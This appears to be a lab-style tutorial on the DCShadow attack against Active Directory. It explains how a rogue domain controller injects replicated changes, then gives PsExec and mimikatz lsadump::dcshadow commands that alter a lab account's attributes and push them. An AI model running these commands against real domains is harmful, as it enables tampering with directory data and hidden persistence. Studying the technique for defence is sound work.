# DCShadow Attack Overview

## What is DCShadow?

DCShadow is a type of attack that allows an attacker to create a rogue domain controller (DC) in an Active Directory (AD) environment without actually compromising a legitimate DC. This attack can be used to manipulate the replication process and inject malicious changes into the AD database, giving the attacker control over the entire AD environment.

### How DCShadow Works

The DCShadow attack works by using the same replication protocols and techniques that legitimate domain controllers use to communicate with each other. An attacker with administrative privileges can use this technique to simulate the behavior of a DC and force replication of malicious changes to other DCs in the environment. This can enable the attacker to create backdoors or establish persistence in the AD environment, allowing them to maintain control even if their original access is removed.

It simulates the behavior of a Domain Controller (using protocols like RPC used only by DC) to inject its own data, bypassing most common security controls including your SIEM. It shares some similarities with the DCSync attack (already present in the `lsadump` module of mimikatz).

## Execution Steps

### Run as System
```powershell
PsExec.exe -i -s cmd
```

### Push Attribute Change
```powershell
mimikatz.exe
```
![image](https://github.com/user-attachments/assets/ba70f94b-f451-4f8e-895b-2d7861b5619a)

### Change Value of Bad Password for Student5 Account
We are going to change the bad password count for `student5` account from 9999 to 3333.
```powershell
lsadump::dcshadow /object:student5 /attribute:badpwdcount /value:3333
lsadump::dcshadow /object:student5 /attribute:PwdLastset /value:0x1D4B32777877508
```

### Open Command Prompt as Administrator
```powershell
mimikatz.exe
lsadump::dcshadow /push
```
![image](https://github.com/user-attachments/assets/7b08f58e-a94e-4222-a379-fb69db5b1744)

![image](https://github.com/user-attachments/assets/86f79c3f-ddbf-47b4-a2ad-30174923ca1a)

This approach enables the attacker to create backdoors or establish persistence in the AD environment, giving them control even if their original access is removed.
